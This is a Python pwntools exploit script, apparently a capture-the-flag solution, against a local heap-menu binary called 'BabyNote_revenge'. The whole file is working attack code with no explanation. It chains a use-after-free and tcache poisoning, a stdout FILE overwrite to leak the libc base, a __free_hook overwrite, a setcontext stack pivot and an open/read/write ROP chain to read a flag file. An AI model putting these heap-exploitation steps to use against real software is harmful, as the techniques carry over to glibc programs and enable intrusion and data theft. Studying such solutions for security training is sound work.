from pwn import *
context.log_level = "debug"

def choice(i):
    p.sendlineafter(">>> ",str(i))

def add(s):
    #0x60 chunk
    choice(1)
    p.sendafter("Input Content:",s)

def edit(i,s):
    choice(2)
    p.sendlineafter("Input ID:",str(i))
    p.sendafter("Input Content:",s)

def dele(i):
    choice(3)
    p.sendlineafter("Input ID:",str(i))

def debug():
    print(pidof(p))
    raw_input()

def gift(addr,libcbase):
    choice(666)
    p.sendlineafter("'puts': ",str(addr))
    p.recvuntil("gift: ")
    heapaddr = int(p.recv(14))
    log.success("heapaddr: "+hex(heapaddr))
    for i in range(2):
        p.sendlineafter("addr: ",str(libcbase+0x1ebbf0+i*8))#unsorted bin
        p.sendafter("value: ",p64(libcbase+0x1ebbe0))
    
    p.sendlineafter("addr: ",str(libcbase+libc.symbols["__free_hook"]))
    p.sendafter("value: ",p64(0x0000000000154930+libcbase))
    return heapaddr



p = process("./BabyNote_revenge")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#debug()
#11:0x420
for i in range(12):
    add(b"aaaaaaaaa")
dele(0)
dele(1)
edit(1,b"\x90")
add(b"cccccc")#12
add(p64(0)+p64(0x61))#13
dele(1)
dele(0)#tcache
edit(13,p64(0)+p64(0x421))
dele(0)#unsorted bin
edit(13,p64(0)+p64(0x421)+b"\xa0\xb6")
add(b"bbbbbbbb")#14
add(p64(0xfbad1800)+b'a'*0x18+b'\x00')#15 stdout
p.recvline()
p.recv(8)
libcbase = u64(p.recv(6).ljust(8,b"\x00"))-0x1eb980
log.success("libcbase: "+hex(libcbase))
debug()
puts = libcbase + libc.symbols["puts"]
log.success("puts: "+hex(puts))
heapaddr = gift(puts,libcbase)

pop_rdi = libcbase + 0x0000000000026b72
pop_rsi = libcbase + 0x0000000000027529
pop_rdx_rbx = libcbase + 0x0000000000162866
pop_rax = libcbase + 0x000000000004a550
puts = libcbase + libc.symbols["puts"]
read = libcbase + libc.symbols["read"]
syscall = read + 16
ret = libcbase + 0x0000000000025679
'''
gadget:
0x0000000000154930 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr
 [rdx + 0x20]

'''
rdx = heapaddr + 0x60 - 0x20
edit(0,b"./flag\x00\x00"+p64(rdx))
edit(1,p64(libcbase + libc.symbols["setcontext"]+61))
'''
rsp:rdx+0xa0
rip:rdx+0xa8
chunk2
'''
edit(2,p64(0)*4+p64(heapaddr+0x60*3)+p64(ret))
#0x58 11
orw_open = p64(pop_rdi) + p64(heapaddr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall) + p64(ret)*3 + p64(pop_rdi) 
orw_read = p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heapaddr) + p64(pop_rdx_rbx) + p64(0x50) + p64(0) + p64(read) + p64(ret)*2 + p64(pop_rdi)
orw_write = p64(pop_rdi) + p64(heapaddr) + p64(puts)
edit(3,orw_open)
edit(4,orw_read)
edit(5,orw_write)
dele(0)
p.recvline()
print(p.recvline())
#p.interactive()
